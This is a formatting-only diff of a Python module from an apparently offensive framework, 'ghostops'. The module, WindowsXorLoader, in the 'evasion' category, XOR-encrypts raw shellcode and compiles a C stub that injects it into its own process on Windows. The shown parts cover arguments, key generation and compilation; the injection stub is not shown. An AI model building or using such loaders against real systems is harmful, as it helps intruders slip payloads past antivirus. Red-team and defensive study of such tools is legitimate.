@@ -5,9 +5,12 @@ from pathlib import Path
 from ghostops.core.module_base import BaseModule
 from ghostops.core.utils import Logger
 
+
 class WindowsXorLoader(BaseModule):
     module_name = "WindowsXorLoader"
-    module_description = "Injects XOR-encrypted shellcode into its own process using a generated C stub."
+    module_description = (
+        "Injects XOR-encrypted shellcode into its own process using a generated C stub."
+    )
     module_author = "Awagat Dhungana <4w4647@gmail.com>"
     module_category = "evasion"
     module_target_os = ["windows"]
@@ -18,29 +21,29 @@ class WindowsXorLoader(BaseModule):
         parser.add_argument(
             "--payload",
             required=True,
-            help="Path to raw shellcode binary file (e.g., ghostops.bin)"
+            help="Path to raw shellcode binary file (e.g., ghostops.bin)",
         )
         parser.add_argument(
             "--password",
             required=False,
-            help="XOR key (string). If not provided, a random key is generated"
+            help="XOR key (string). If not provided, a random key is generated",
         )
         parser.add_argument(
             "--arch",
             choices=["x86", "x64"],
             required=True,
-            help="Target architecture for the executable"
+            help="Target architecture for the executable",
         )
         parser.add_argument(
             "--output",
             required=True,
-            help="Output filename for the compiled executable (e.g., ghostops.exe)"
+            help="Output filename for the compiled executable (e.g., ghostops.exe)",
         )
 
     @staticmethod
     def generate_random_key(length=15) -> bytes:
         charset = string.ascii_letters + string.digits + string.punctuation
-        return ''.join(random.choice(charset) for _ in range(length)).encode()
+        return "".join(random.choice(charset) for _ in range(length)).encode()
 
     @staticmethod
     def xor_encrypt(data: bytes, key: bytes) -> bytes:
@@ -92,8 +95,7 @@ int main() {{
 
         try:
             subprocess.run(
-                [compiler, str(source_file), "-o", str(output_exe)] + flags,
-                check=True
+                [compiler, str(source_file), "-o", str(output_exe)] + flags, check=True
             )
             Logger.log("good", f"Executable compiled: {output_exe}")
         except subprocess.CalledProcessError as e:
@@ -120,7 +122,9 @@ int main() {{
             Logger.log("info", f"Using provided XOR key: {args.password}")
         else:
             xor_key = WindowsXorLoader.generate_random_key()
-            Logger.log("info", f"Generated random XOR key: {xor_key.decode(errors='ignore')}")
+            Logger.log(
+                "info", f"Generated random XOR key: {xor_key.decode(errors='ignore')}"
+            )
 
         encrypted_shellcode = WindowsXorLoader.xor_encrypt(shellcode, xor_key)
 
